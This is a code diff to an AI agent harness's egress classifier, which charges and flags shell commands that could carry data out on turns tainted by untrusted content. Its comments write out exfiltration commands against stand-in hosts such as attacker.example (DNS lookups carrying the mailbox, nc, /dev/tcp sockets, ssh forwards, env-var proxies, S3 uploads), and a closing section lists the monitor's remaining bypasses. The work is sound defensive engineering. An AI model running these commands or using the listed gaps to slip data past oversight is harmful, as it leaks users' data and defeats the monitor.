@@ -691,11 +691,17 @@ export const gitConfigRunsCode = (args: readonly string[]): boolean => {
  */
 const URL_IN_COMMAND = /https?:\/\/[^\s'"`<>\\)]+/g;
 
-const literalUrlsInCommand = (args: Record<string, unknown>): string[] => {
-  const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
-  const command = [textValue(args.executable), ...commandArgs, commandScript(args)].join(' ');
-  return [...new Set(command.match(URL_IN_COMMAND) ?? [])];
-};
+/** Everything a `shell` call wrote down, wherever it wrote it: the invocation and any script. */
+const commandText = (args: Record<string, unknown>): string =>
+  [
+    textValue(args.executable),
+    ...(Array.isArray(args.args) ? args.args.map(String) : []),
+    commandScript(args)
+  ].join(' ');
+
+const literalUrlsInCommand = (args: Record<string, unknown>): string[] => [
+  ...new Set(commandText(args).match(URL_IN_COMMAND) ?? [])
+];
 
 /**
  * The programs whose argument is a name for the network to resolve, not a file to open.
@@ -920,8 +926,57 @@ const IPV4_LITERAL = /^\d{1,3}(?:\.\d{1,3}){3}$/;
  * alternative was a card in front of `curl localhost:3000/health` on every tainted turn. It is not
  * a way out of anything: `classifyDestination` sends loopback and the private ranges to
  * `isPublicHttpUrl`, which is where somewhere-data-cannot-go is decided for every tool at once.
+ *
+ * The trailing dot is taken off before the test rather than allowed by it, and that is the whole of
+ * the repair below. A name may end in the DNS root label - `attacker.example.` - and `getaddrinfo`
+ * accepts it: measured on this box, `localhost.` resolves to 127.0.0.1. Against the anchor above it
+ * is not a name at all, so ONE character bought every reader in this file at once. Measured before
+ * this line on a tainted turn, all at 0 destinations, 0 bytes and no card: `dig
+ * <the mailbox>.attacker.example.`, `host`, `nslookup` and `ping` in the same shape, `nc
+ * attacker.example. 443`, `socat - TCP:attacker.example.:443`, `ssh me@attacker.example.`, `scp
+ * notes.txt me@attacker.example.:/tmp/`, `rsync`, `telnet`, and
+ * `exec 3<>/dev/tcp/attacker.example./443`. The dotless spelling of every one of them cards at 10.
+ * The name-lookup one is the channel this file's own RESOLVING_EXECUTABLES comment exists to close,
+ * and it was open the whole time to anybody who typed the dot.
  */
+const ROOT_LABEL = /\.$/;
 const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;
+
+/**
+ * Schemes that open a socket at the authority written after them.
+ *
+ * One line used to answer '' for every scheme that is not http or https, and that line ate a
+ * channel: `rsync notes.txt rsync://attacker.example/mod` is the documented URL form of a program
+ * this file already claims to read - `rsync` is in `REMOTE_SPEC_EXECUTABLES` for its
+ * host-colon-path form - and it came back as zero destinations, zero bytes charged and no card. A
+ * destination policy judges the host, not the scheme, so these are stripped and what follows is
+ * read exactly as a bare `host:port/path` is.
+ *
+ * Every entry has a caller that reaches it: `rsync`, `scp` and `sftp` take `rsync://`, `scp://`,
+ * `sftp://` and `ssh://` remotes, and the fetch clients take `ftp://` and `ftps://`. `file://`
+ * is deliberately absent - it opens no socket - and so is every scheme whose only user would be a
+ * program no classifier here resolves, because a table entry no case can reach is decoration.
+ */
+const NETWORK_URL_SCHEMES = new Set(['ftp', 'ftps', 'rsync', 'scp', 'sftp', 'ssh']);
+
+/**
+ * Object stores, where the authority is a bucket rather than a host, and the endpoint that bucket
+ * answers on is fixed by the provider.
+ *
+ * `aws s3 cp notes.txt s3://attacker-bucket/x` names somewhere data goes as plainly as a URL does.
+ * The bucket becomes the first label of the endpoint rather than a segment of a path on a shared
+ * one, and that is the whole of the choice: under path style every bucket on earth would share one
+ * host, so the first `aws s3` command of a turn would buy every later one for two bytes. Under the
+ * virtual-host form the provider actually serves, a bucket nobody named is a host nobody named and
+ * `classifyDestination` judges it as one.
+ */
+const BUCKET_URL_HOSTS: Record<string, string> = {
+  gs: 'storage.googleapis.com',
+  s3: 's3.amazonaws.com'
+};
+
+/** What both providers allow a bucket to be called, at its longest. */
+const BUCKET_NAME = /^[a-z0-9][a-z0-9._-]{1,62}$/i;
 
 /**
  * The request one command argument would make, as an address, or '' when it names none.
@@ -932,16 +987,35 @@ const DOTTED_NAME = /^(?:localhost|(?:[a-z0-9_-]+\.)+[a-z][a-z0-9-]+)$/i;
  * name is taken from the front and whatever follows is kept as the path - the part the budget then
  * charges. The scheme is filled in as https because `classifyDestination` reads only http and https
  * and neither the charge nor the host judgement depends on which of the two it is.
+ *
+ * The userinfo is stripped from the authority rather than from the whole token, because `@` is a
+ * legal character in a path and a bucket key is a path: taking everything after the last one read
+ * `s3://bucket/inbox@2026` as a host called `2026`.
  */
 const addressFromArgument = (raw: string): string => {
-  const token = raw.replace(/^['"]+|['"]+$/g, '').trim();
-  if (!token) return '';
-  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(token)) return /^https?:\/\//i.test(token) ? token : '';
-  const body = token.slice(token.lastIndexOf('@') + 1);
-  const cut = body.search(/[/?#]/);
-  const authority = cut < 0 ? body : body.slice(0, cut);
-  const tail = cut < 0 ? '' : body.slice(cut);
-  const [host = '', port = ''] = authority.split(':');
+  const written = raw.replace(/^['"]+|['"]+$/g, '').trim();
+  if (!written) return '';
+  const scheme = /^([a-z][a-z0-9+.-]*):\/\//i.exec(written);
+  let token = scheme ? written.slice(scheme[0].length) : written;
+  if (scheme) {
+    const name = (scheme[1] ?? '').toLowerCase();
+    if (name === 'http' || name === 'https') return written;
+    const endpoint = BUCKET_URL_HOSTS[name];
+    if (endpoint) {
+      const split = token.search(/[/?#]/);
+      const bucket = (split < 0 ? token : token.slice(0, split)).toLowerCase();
+      if (!BUCKET_NAME.test(bucket)) return '';
+      token = `${bucket}.${endpoint}${split < 0 ? '' : token.slice(split)}`;
+    } else if (!NETWORK_URL_SCHEMES.has(name)) return '';
+  }
+  const cut = token.search(/[/?#]/);
+  const tail = cut < 0 ? '' : token.slice(cut);
+  const withUser = cut < 0 ? token : token.slice(0, cut);
+  const authority = withUser.slice(withUser.lastIndexOf('@') + 1);
+  const [writtenHost = '', port = ''] = authority.split(':');
+  // See ROOT_LABEL. The name is normalised before it is judged and before it is returned, so the
+  // card, the suffix match and the budget all read the host the resolver will actually use.
+  const host = writtenHost.length > 1 ? writtenHost.replace(ROOT_LABEL, '') : writtenHost;
   if (!(IPV4_LITERAL.test(host) || DOTTED_NAME.test(host))) return '';
   try {
     return new URL(`https://${host}${/^\d+$/.test(port) ? `:${port}` : ''}${tail || '/'}`).href;
@@ -1033,6 +1107,136 @@ const redirectedAddress = (option: string, rawValue: string): string | null => {
 };
 
 /**
+ * The `openssl` subcommands that open a connection, and the options that say where it opens.
+ *
+ * A TLS client is a fetch client with a different name on it: `openssl s_client -connect
+ * attacker.example:443 -quiet` is a two-way socket to a host of the model's choosing, it needs no
+ * program this box does not already ship, and it was measured here at zero destinations, zero bytes
+ * and no card. The grammar is as fixed as `curl --resolve`: `-connect host:port` says where the
+ * socket opens, `-proxy host:port` says it opens there instead and the connect host is named to the
+ * proxy - both are real, so both are reported - and `-servername` is the name written into the
+ * handshake in the clear, which is material the request carries to whoever answers.
+ *
+ * The options and not the operands, because most of `openssl` is arithmetic on local files:
+ * `openssl x509 -in cert.pem` reaches nothing, and reading its operands the way a fetch client's
+ * are read would have turned `cert.pem` into an address - `pem` is as legal a top-level label as
+ * `com` - and put a card in front of a certificate being printed.
+ *
+ * Gated on the subcommand as well, for the one place the options alone are not enough:
+ * `openssl s_server -servername docs.example.com -accept 4433` spells the same option and LISTENS.
+ * A name a server will answer to is not somewhere data goes, and inbound is not egress.
+ */
+const OPENSSL_CONNECTING_SUBCOMMANDS = new Set(['s_client', 's_time']);
+const OPENSSL_ADDRESS_OPTIONS = new Set(['-connect', '-proxy', '-servername', '-host']);
+
+/**
+ * Clients whose far end is a bucket, named by a URL scheme the provider owns.
+ *
+ * Only the tokens that carry a scheme are read, and that is the safety rather than a shortcut:
+ * `aws s3 cp notes.txt s3://bucket/x` names a local file beside the bucket, and `notes.txt` has a
+ * top-level label as legal as `com`. Reading every operand as a possible host would have reported
+ * `https://notes.txt/` as somewhere the owner's data went.
+ *
+ * `rclone` is deliberately absent. Its far end is a remote name defined in its own configuration -
+ * `rclone copy notes drive:backup` - so requiring an address of it would card ordinary work to
+ * catch a shape it cannot read anyway, which is the decision already taken for `git` and `gh`.
+ */
+const OBJECT_STORE_EXECUTABLES = new Set(['aws', 'az', 'gcloud', 'gsutil', 's3cmd']);
+
+/**
+ * Where an `az storage` call puts its bytes.
+ *
+ * Azure writes its far end as a flag rather than as a URL, and the pair is still a fixed grammar:
+ * the account name and the service word compose `<account>.<service>.core.windows.net`, which is
+ * the endpoint the provider serves rather than a name invented here. Only the data-plane nouns are
+ * mapped - `az storage account list` manages the account rather than writing to it - and a noun
+ * this cannot place names no address at all rather than a guessed one.
+ */
+const AZURE_STORAGE_SERVICES: Record<string, string> = {
+  blob: 'blob',
+  container: 'blob',
+  copy: 'blob',
+  directory: 'file',
+  file: 'file',
+  fs: 'dfs',
+  queue: 'queue',
+  share: 'file',
+  table: 'table'
+};
+const AZURE_ACCOUNT_OPTIONS = new Set(['--account-name']);
+
+const azureStorageAddress = (commandArgs: readonly string[]): string => {
+  const operands = commandArgs.filter((argument) => !argument.startsWith('-'));
+  if ((operands[0] ?? '').toLowerCase() !== 'storage') return '';
+  const service = AZURE_STORAGE_SERVICES[(operands[1] ?? '').toLowerCase()] ?? '';
+  const account = commandArgs
+    .map(
+      (_argument, index) => optionValueAt(commandArgs, index, AZURE_ACCOUNT_OPTIONS)?.value ?? ''
+    )
+    .find(Boolean);
+  // An account named at run time, or through `AZURE_STORAGE_CONNECTION_STRING`, is one this cannot
+  // read - and it is not carded as unreadable, because `az storage` has a hundred subcommands that
+  // name no account and interrupting all of them would be the card that gets the floor switched off.
+  return service && account && /^[a-z0-9]{3,24}$/i.test(account)
+    ? `https://${account.toLowerCase()}.${service}.core.windows.net/`
+    : '';
+};
+
+/**
+ * Socat writes its far end as `TYPE:host:port`, so the host is the second field rather than the
+ * first.
+ *
+ * `socat` has been in `CONNECTING_EXECUTABLES` all along and the entry could not fire: the reader
+ * takes an authority as host and port, so `TCP:attacker.example:443` was a host called `TCP` and
+ * failed the name test. The type prefix is enumerated rather than matched loosely, because
+ * `EXEC:`, `FILE:` and `OPEN:` are the same grammar naming something local.
+ *
+ * `socks5` is here beside `socks4`, which was written without it. Both spellings put the proxy
+ * socat actually dials in the first field after the type, so the host this reads is the host the
+ * socket opens at, exactly as for `proxy` - and `socat - SOCKS5:attacker.example:1.2.3.4:80` was
+ * measured at 0 destinations with `socks4` alone in the list.
+ */
+const SOCAT_CONNECTING_TYPE =
+  /^(?:tcp|udp|sctp|dtls|ssl|openssl|socks4a?|socks5|proxy)[46]?(?:-connect)?:/i;
+const socatTarget = (argument: string): string =>
+  SOCAT_CONNECTING_TYPE.test(argument) ? argument.slice(argument.indexOf(':') + 1) : argument;
+
+/**
+ * Options whose value is a local file that CONTAINS the addresses.
+ *
+ * `curl -K leak.conf` and `wget -i urls.txt` write their far end down one level of indirection
+ * away, in a file this reader cannot open. The address is unreadable rather than absent, and
+ * unreadable is the case the fallback below exists for: without this, tightening that fallback so
+ * `curl --version` stops carding would also have stopped `curl -K` carding, and the second one
+ * really does reach somewhere.
+ */
+const ADDRESS_FILE_OPTIONS: Record<string, ReadonlySet<string>> = {
+  curl: new Set(['-K', '--config']),
+  wget: new Set(['-i', '--input-file'])
+};
+
+/**
+ * Where an ssh forward sends what goes into it.
+ *
+ * `ssh -L 8080:attacker.example:80 bastion.example` is the `--resolve` shape wearing ssh's clothes:
+ * every argument on the card names the bastion, the bastion is a host the owner named, and the
+ * bytes a later `curl localhost:8080/?q=<the mailbox>` puts into the tunnel come out at
+ * `attacker.example`. That second command is loopback and free, so without this the whole sequence
+ * is charged for the one hop the owner would have approved anyway.
+ *
+ * Both hops are real - unlike `--resolve`, the bastion does receive the bytes - so the forward
+ * target JOINS the connection host rather than replacing it. The grammar is ssh's own:
+ * `[bind:]port:host:hostport` for `-L` and `-R`, `host:port` for `-W`, so the host is the second
+ * field of three, the third of four, and the first of two. `-D` opens a SOCKS proxy and names no
+ * host at all, which is why it is not here.
+ */
+const SSH_FORWARD_OPTIONS = new Set(['-L', '-R', '-W']);
+const forwardedHost = (value: string): string => {
+  const fields = value.split(':');
+  return (fields.length === 2 ? fields[0] : fields.length === 3 ? fields[1] : fields[2]) ?? '';
+};
+
+/**
  * Every address one resolved command would reach, and the material it would carry there.
  *
  * The addresses and the carried material come back as one list of URLs because that is what the
@@ -1046,13 +1250,36 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
   const local = LOCAL_VALUE_OPTIONS[name];
   const carriedTable = CARRIED_VALUE_OPTIONS[name];
   const redirectingTable = REDIRECTING_VALUE_OPTIONS[name];
+  // Only where the subcommand is one that connects. See OPENSSL_CONNECTING_SUBCOMMANDS.
+  const addressTable =
+    name === 'openssl' &&
+    OPENSSL_CONNECTING_SUBCOMMANDS.has(
+      (commandArgs.find((argument) => !argument.startsWith('-')) ?? '').toLowerCase()
+    )
+      ? OPENSSL_ADDRESS_OPTIONS
+      : undefined;
   const skip = new Set<number>();
   const carried: Array<[string, string]> = [];
   const redirects: string[] = [];
+  const named: string[] = [];
+  const forwards: string[] = [];
+  let addressFile = false;
   let redirected = false;
   commandArgs.forEach((_argument, index) => {
     const localOption = optionValueAt(commandArgs, index, local);
     if (localOption?.takesNext) skip.add(index + 1);
+    if (optionValueAt(commandArgs, index, ADDRESS_FILE_OPTIONS[name])) addressFile = true;
+    const forwardOption =
+      name === 'ssh' ? optionValueAt(commandArgs, index, SSH_FORWARD_OPTIONS) : null;
+    if (forwardOption) {
+      if (forwardOption.takesNext) skip.add(index + 1);
+      forwards.push(forwardedHost(forwardOption.value));
+    }
+    const addressOption = optionValueAt(commandArgs, index, addressTable);
+    if (addressOption) {
+      if (addressOption.takesNext) skip.add(index + 1);
+      if (addressOption.value) named.push(addressOption.value);
+    }
     const redirectingOption = optionValueAt(commandArgs, index, redirectingTable);
     if (redirectingOption) {
       if (redirectingOption.takesNext) skip.add(index + 1);
@@ -1078,17 +1305,40 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
   // `dig @1.1.1.1 <name>` asks a resolver of the model's choosing, and that resolver is where the
   // name goes; `addressFromArgument` takes the host from after the last `@` for exactly this and
   // for `ssh me@host`, so the server needs no branch of its own.
-  if (FETCH_CLIENT_EXECUTABLES.has(name) || RESOLVING_EXECUTABLES.has(name))
+  if (addressTable) addresses = resolve(named);
+  else if (FETCH_CLIENT_EXECUTABLES.has(name) || RESOLVING_EXECUTABLES.has(name))
     addresses = resolve(candidates);
   // An override speaks for the whole command: it is where the socket opens, so the host the rest of
   // the arguments name never receives anything. An override this cannot read leaves no addresses at
   // all, which drops through to the unreadable-address card below rather than back to that host.
   if (redirected) addresses = redirects;
-  else if (CONNECTING_EXECUTABLES.has(name)) addresses = resolve(candidates).slice(0, 1);
+  else if (CONNECTING_EXECUTABLES.has(name))
+    // The connection host, and then wherever a forward would carry what goes into it. Both, because
+    // both receive the bytes - see SSH_FORWARD_OPTIONS.
+    addresses = [...resolve(candidates.map(socatTarget)).slice(0, 1), ...resolve(forwards)];
   else if (REMOTE_SPEC_EXECUTABLES.has(name))
     addresses = resolve(candidates.filter((argument) => /[:@]/.test(argument)));
+  else if (OBJECT_STORE_EXECUTABLES.has(name))
+    addresses = [
+      ...resolve(candidates.filter((argument) => /^[a-z][a-z0-9+.-]*:\/\//i.test(argument))),
+      ...[azureStorageAddress(commandArgs)].filter(Boolean)
+    ];
+  /*
+   * The tokens this command wrote down as its far end, which is a different question from whether
+   * any of them could be read.
+   *
+   * A client that always names one and named nothing readable is the unreadable-address case, and
+   * asking about it is the whole point of the fallback below - an operand this could not read, or a
+   * file it was told the addresses are listed in. A client that named none at all is not: `curl
+   * --version` and `curl --help` contact nothing, and both raised "Allow this command to unparseable
+   * address", charging four bytes for the word `curl` - a card naming a destination for a command
+   * that reaches none, which is the one thing a card must not do.
+   */
+  const wroteAnAddress = addressTable
+    ? named.length > 0
+    : FETCH_CLIENT_EXECUTABLES.has(name) && (candidates.length > 0 || addressFile);
   if (!addresses.length)
-    return FETCH_CLIENT_EXECUTABLES.has(name)
+    return wroteAnAddress
       ? // Carded and charged as the unreadable address it is. What goes back is the token the
         // command actually wrote plus whatever it carries, so the bytes charged are bytes that are
         // really present rather than a number invented here, and `classifyDestination` reports it
@@ -1112,6 +1362,132 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
 };
 
 /**
+ * A socket opened as a path.
+ *
+ * bash needs no program on the box to reach the network: `exec 3<>/dev/tcp/attacker.example/443`
+ * opens the connection and `echo <the mailbox> >&3` writes to it, and the same two words spell
+ * `/dev/udp`. The grammar is fixed - the host is the third field of the path and the port the
+ * fourth - so the far end is written down as plainly as a URL writes it. Every reader here missed
+ * it because it is a redirection rather than a command: `scriptCommands` splits the segment
+ * `3<>/dev/tcp/attacker.example/443`, takes the last path element as the executable, finds `443`,
+ * and drops it as the number it is. So the text is scanned for the path itself, exactly as the
+ * literal address scan beside it is.
+ *
+ * The port is not required to be numeric because bash accepts a service name, and
+ * `addressFromArgument` already keeps only a numeric one.
+ */
+const DEV_SOCKET_PATH = /\/dev\/(?:tcp|udp)\/([^\s/'"`;|&<>()]+)\/([A-Za-z0-9_-]+)/gi;
+
+/**
+ * Whether one of those paths was opened for READING, which is a different question from whether it
+ * was opened at all.
+ *
+ * `untrustedShellOrigin` asks whether somebody else's bytes came back into the window, and the file
+ * already refuses to answer yes for a `ping` on the grounds that a lookup sends far more than it
+ * returns. A write-only `echo x > /dev/tcp/host/80` is that same shape and taints nothing; `<` and
+ * the read-write `3<>` are the spellings that bring an answer back, and `<` is what tells them
+ * apart. Both are destinations either way.
+ */
+const DEV_SOCKET_READ = /<>?\s*['"]?\/dev\/(?:tcp|udp)\//i;
+
+const devSocketAddresses = (text: string): string[] =>
+  [...text.matchAll(DEV_SOCKET_PATH)]
+    .map(([, host = '', port = '']) => addressFromArgument(`${host}:${port}`))
+    .filter(Boolean);
+
+/*
+ * WHAT THIS DOES NOT READ.
+ *
+ * A bound that claims more than it delivers is worse than one that states its edge, and a stated
+ * edge that has gone stale is worse than both. Every line here was measured on this tree, against
+ * the real `classifyDestination`, on a turn already marked tainted.
+ *
+ * 1. A CLEAN TURN. The whole budget applies only while untrusted content is in the turn; `dig
+ *    <the mailbox>.attacker.example` on a turn that has read nothing hostile is charged nothing and
+ *    raises nothing. That is the product's policy rather than a gap in this file, and it is still
+ *    the largest one.
+ * 2. A PROGRAM THIS HAS NO TABLE FOR. `python3 -c 'socket.create_connection((h, 443))'`,
+ *    `node -e 'fetch(u)'`, `docker push registry.example/img`, `smbclient //host/share`,
+ *    `ldapsearch -H ldap://host`, `sendmail somebody@example.com < notes.txt` and `mail -s x
+ *    somebody@example.com` all come back as 0 destinations. `effectiveCommands` finds the command;
+ *    it is not one of the clients whose argument grammar is written down here, so its far end is
+ *    read only if an http(s) address is spelled out in the invocation, by the literal scan. This is
+ *    the open class, and every program added to it shrinks it by one.
+ * 3. AN ADDRESS COMPOSED AT RUN TIME. `curl -s "$U"` and `openssl s_client -connect "$H:443"` are
+ *    unreadable to any static reader, and they raise the unreadable-address card rather than
+ *    passing quietly - but the host itself is never known, and `git clone "$U"`, `gh api "$P"`,
+ *    `dig "$H.attacker.example"` and `rclone copy notes drive:backup` are not carded at all,
+ *    because their far end lives in configuration and requiring one would card the ordinary work of
+ *    this product. `/dev/tcp/$H/443` is unreadable in exactly the same way.
+ * 4. A PAYLOAD THAT IS A FILE. `curl -d @secrets.json`, `openssl s_client … < secrets.json` and
+ *    `aws s3 cp secrets.json s3://known-bucket/x` are charged for the address and the token, not for
+ *    the file: its bytes are not readable here. The first is still carded by
+ *    `sendsDataOverNetwork`; the charge understates all three by as much as the file is large.
+ * 5. ADDRESSES IN A FILE. `curl -K leak.conf`, `wget -i urls.txt` and `xargs curl < urls.txt` all
+ *    raise the unreadable-address card, and none of them is charged for what is in the file: the
+ *    first two are charged 4 bytes for the client's own name, and the third reports
+ *    `https://urls.txt/`, because `urls.txt` has as legal a top-level label as any host. That last
+ *    one errs towards the card and names a host that does not exist while doing it.
+ * 6. AN AZURE ACCOUNT THAT IS NOT ON THE COMMAND LINE. `az storage blob upload` reads
+ *    `AZURE_STORAGE_ACCOUNT` and `AZURE_STORAGE_CONNECTION_STRING` from the environment when
+ *    `--account-name` is absent, and an environment is not an argument. Not carded as unreadable
+ *    either, for the reason in `azureStorageAddress`.
+ * 7. A HOST WITH NO DOT IN IT OTHER THAN `localhost`. `curl myserver:8080/x` on a LAN name is not
+ *    read as an address; for a fetch client it is the unreadable-address card instead, and for
+ *    everything else it is nothing at all.
+ * 11. A NAME SPELLED AS A NUMBER. `nc 134744072 443` reaches 8.8.8.8 - `getaddrinfo` takes the
+ *    32-bit integer form, verified on this box - and every IPv6 literal reaches its host:
+ *    `nc 2001:4860:4860::8888 443`, `ssh me@2001:4860:4860::8888`,
+ *    `socat - TCP6:[2001:4860:4860::8888]:443` and `/dev/tcp/2001:4860:4860::8888/443` are all 0
+ *    destinations. `IPV4_LITERAL` is dotted-quad only, and the authority is split on `:`, which an
+ *    IPv6 literal is made of. A fetch client is the exception in both cases and only because the
+ *    literal scan reads the URL it wrote: `curl http://[2001:4860:4860::8888]/x` cards at 24.
+ * 12. A PROXY IN THE ENVIRONMENT. `http_proxy=attacker.example:3128 curl
+ *    https://docs.example.com/g?q=SECRETS` charges its 11 bytes to `docs.example.com`, a host the
+ *    owner named, and raises nothing; `ALL_PROXY` and `https_proxy` are the same fact, and
+ *    `git config http.proxy attacker.example:3128 && git push` is 0 destinations. `withoutRunners`
+ *    strips leading `FOO=1` assignments to find the command that runs, and the far end is in the
+ *    assignment it stripped. This is the shape `REDIRECTING_VALUE_OPTIONS` calls worse than
+ *    unreadable - unreadable asks the owner, and this answers confidently with the wrong host -
+ *    and unlike `--resolve` it is not closed. `https_proxy=http://attacker.example:3128` is carded
+ *    at 29 only because the literal scan reads the scheme somebody happened to write.
+ * 8. AN OBJECT STORE THE OWNER HAS NOT NAMED IN A FORM THE HARNESS RECORDED. `aws s3 ls
+ *    s3://dan-backups` resolves to `dan-backups.s3.amazonaws.com`, and on a tainted turn a host
+ *    nobody named is a sink - one card, exactly as a novel https host raises one. Naming the bucket
+ *    in the request costs 2 bytes and no card once the endpoint is a known origin.
+ * 9. WHAT A CONNECTION CARRIES ONCE IT IS OPEN. `nc`, `socat`, `ssh` and `openssl s_client` are
+ *    read for where they connect, and everything after that is a stream this cannot see. The
+ *    address is charged; the payload is not.
+ * 10. A COMMAND HIDDEN IN AN OPTION VALUE. `ssh -o ProxyCommand='nc attacker.example 443' host`
+ *    names its far end inside a string that is itself a command, and `-o` is in
+ *    `LOCAL_VALUE_OPTIONS` so the value is skipped entirely. Reading it would mean running the
+ *    whole classifier again on a value, which is worth doing and is not done here.
+ *
+ * AND WHAT IT NOW ASKS ABOUT THAT IT DID NOT, which is the same list read from the other side and
+ * the half that decides whether any of this stays switched on. On a tainted turn, one card each,
+ * charged against the owner's own corpus: `ping -c1 8.8.8.8` (8 bytes), `ssh -T git@github.com`
+ * (8), `scp build.tgz deploy@release.example.com:/srv/` (9), `openssl s_client -connect
+ * novel.example:443` (7) and `aws s3 ls s3://dan-backups` (24). Every one of them is a host nobody
+ * named, and the same commands against a host the owner did name cost 2 or 3 bytes and raise
+ * nothing: measured on this tree at `openssl s_client -connect docs.example.com:443` = 2,
+ * `rsync -a ./build/ deploy@docs.example.com:/srv/` = 3, the `rsync://` spelling of it = 3, and the
+ * `/dev/tcp/localhost/3000` health check = 0, because loopback is somewhere data cannot go.
+ *
+ * Two of those cards are new here and both are the root label being taken off the name first:
+ * `dig <the mailbox>.attacker.example.` and `nc attacker.example. 443` were 0 bytes and are now
+ * charged exactly what the dotless spelling is charged - 34 and 10 - and the same normalisation in
+ * `classifyDestination` is what stops `curl https://docs.example.com./guide` costing 10 bytes and a
+ * card for a read of the owner's own host, which it did.
+ *
+ * AND ONE THING IT ASKS ABOUT THAT REACHES NOTHING. The socket-as-a-path scan reads the whole
+ * command text, so a command that only MENTIONS one is carded: `grep -rn
+ * "/dev/tcp/attacker.example/443" notes.txt` and `echo` of the same string are 10 bytes each on a
+ * tainted turn. That is the literal URL scan's own behaviour beside it - `grep https://x.example/p`
+ * has always carded - and it is the direction to be wrong in, but it is a card in front of a
+ * command that opens no socket and it belongs on this list as plainly as the misses do.
+ */
+
+/**
  * Every address one tool call would reach, whichever tool it is.
  *
  * One list, because two of them drift: the approval floor asks what a call reaches in order to
@@ -1123,7 +1499,8 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
  * only the http(s) addresses spelled out in it. The literal scan stays alongside because it is the
  * one reader that works on a shape `effectiveCommands` cannot resolve at all - a script handed to
  * an interpreter as a file, an address in a program this has never heard of - and the two are
- * unioned rather than chosen between.
+ * unioned rather than chosen between. The socket-as-a-path scan is a third reader of the same kind
+ * and for the same reason: it belongs to no command at all.
  */
 export const callDestinations = (name: string, args: Record<string, unknown>): string[] => {
   if (name === 'parallel_web_read') return Array.isArray(args.urls) ? args.urls.map(String) : [];
@@ -1135,7 +1512,10 @@ export const callDestinations = (name: string, args: Record<string, unknown>): s
         : [])
     ].filter(Boolean);
   if (name === 'shell' || name === 'desktop_launch') {
-    const resolved = effectiveCommands(args).flatMap(commandAddresses);
+    const resolved = [
+      ...effectiveCommands(args).flatMap(commandAddresses),
+      ...devSocketAddresses(commandText(args))
+    ];
     // A literal the resolved list already accounts for is the same request, not a second one:
     // `https://x/` and the `https://x/?…` that carries the header are one call and must be one
     // verdict, or the host is charged twice and named twice on the card.
@@ -1242,6 +1622,20 @@ const fetchesRemoteContent = ([executable = '', ...rest]: readonly string[]): bo
   const name = executable.toLowerCase();
   return (
     NETWORK_CLIENT_EXECUTABLES.has(name) ||
+    /*
+     * Two clients that only reach the network on some of their invocations, asked of the one reader
+     * that knows their grammar rather than of a second copy of it.
+     *
+     * `openssl s_client` is a TLS client under another name and prints back whatever the far end
+     * says, while `openssl rand` and `openssl x509` are arithmetic on local files; `aws s3 cp
+     * s3://somebody-elses/brief.md .` brings back bytes the owner did not write, while
+     * `aws --version` brings back nothing. Both questions are already answered by whether the
+     * command names a far end at all, so asking `commandAddresses` is what keeps the taint and the
+     * destination from ever disagreeing - and it is what keeps `openssl s_client -help`, which
+     * connects to nothing, off a turn's provenance.
+     */
+    ((name === 'openssl' || OBJECT_STORE_EXECUTABLES.has(name)) &&
+      commandAddresses([executable, ...rest]).length > 0) ||
     (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
     (packageRemovalExecutables.has(name) &&
       rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())))
@@ -1274,7 +1668,10 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
   if (
     args.network === true ||
     effectiveCommands(args).some(fetchesRemoteContent) ||
-    literalUrlsInCommand(args).length > 0
+    literalUrlsInCommand(args).length > 0 ||
+    // A socket opened for reading is a client with no executable at all. See DEV_SOCKET_READ for
+    // why the write-only spelling is not one.
+    (DEV_SOCKET_READ.test(script) && devSocketAddresses(script).length > 0)
   )
     return 'network command output';
   // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
